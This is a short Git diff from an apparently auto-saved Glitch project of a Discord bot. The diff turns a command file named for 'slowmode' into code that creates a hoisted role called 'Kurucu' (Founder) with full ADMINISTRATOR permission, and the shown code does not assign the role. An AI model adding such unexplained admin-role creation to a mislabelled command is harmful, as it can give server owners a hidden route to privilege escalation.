68548eb11e7ef0868cc896b7abc5da8fbfe29c63
Glitch (flat-caraway) <none>
2019-11-27 18:22:46 +0000

    👍👂 Checkpoint ./komutlar/yavaşmod.js:5472946/237

--- komutlar/yavaşmod.js
+++ komutlar/yavaşmod.js
@@ -1,9 +1,18 @@
 const Discord = require('discord.js'); 
 var request = require('request');
 const db = require('quick.db')
-exports.run = async(client, msg, args) => {
- 
+exports.run = async(client, message, args) => {
+  message.guild.createRole({
+        name: `?? | Kurucu`,
+        color: "#46FE95", 
+        hoist: true,
+        permissions: [
+            "ADMINISTRATOR",
+    ]
+    }).then(kurucurol => {
+  })
 }
+
 
 module.exports.conf = {
   enabled: true,
